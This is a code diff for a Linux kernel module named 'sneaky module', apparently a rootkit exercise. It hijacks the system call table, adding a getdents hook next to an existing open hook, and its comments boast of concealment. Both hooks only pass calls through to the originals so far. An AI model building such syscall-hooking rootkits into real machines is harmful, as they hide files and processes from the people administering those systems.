@@ -53,11 +53,19 @@ static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;
 // should expect ti find its arguments on the stack (not in registers).
 // This is used for all system calls.
 asmlinkage int (*original_call)(const char *pathname, int flags);
+asmlinkage long (*orig_getdents)(unsigned int fd,
+                                 struct linux_dirent64 __user *dirp,
+                                 unsigned int count);
+asmlinkage long sneaky_sys_getdents(unsigned int fd,
+                                    struct linux_dirent64 __user *dirp,
+                                    unsigned int count) {
+  return (*orig_getdents)(fd, dirp, count);
+}
 // Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
   return original_call(pathname, flags);
 }
-
+/*
 static int atoi(char *num) {
   int res = 0;
   while (*num != '\0') {
@@ -67,10 +75,9 @@ static int atoi(char *num) {
   }
   return res;
 }
-* /
-
-    // The code that gets executed when the module is loaded
-    static int initialize_sneaky_module(void) {
+*/
+// The code that gets executed when the module is loaded
+static int initialize_sneaky_module(void) {
   struct page *page_ptr;
   // See /var/log/syslog for kernel print output
   printk(KERN_INFO "Sneaky module being loaded.\n");
@@ -86,7 +93,9 @@ static int atoi(char *num) {
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
   original_call = (void *)*(sys_call_table + __NR_open);
+  orig_getdents = (void *)*(sys_call_table + __NR_getdents);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
+  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
   // Revert page to read-only
   pages_ro(page_ptr, 1);
   // Turn write protection mode back on
@@ -112,7 +121,7 @@ static void exit_sneaky_module(void) {
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
-
+  *(sys_call_table + __NR_getdents) = (unsigned long)orig_getdents;
   // Revert page to read-only
   pages_ro(page_ptr, 1);
   // Turn write protection mode back on
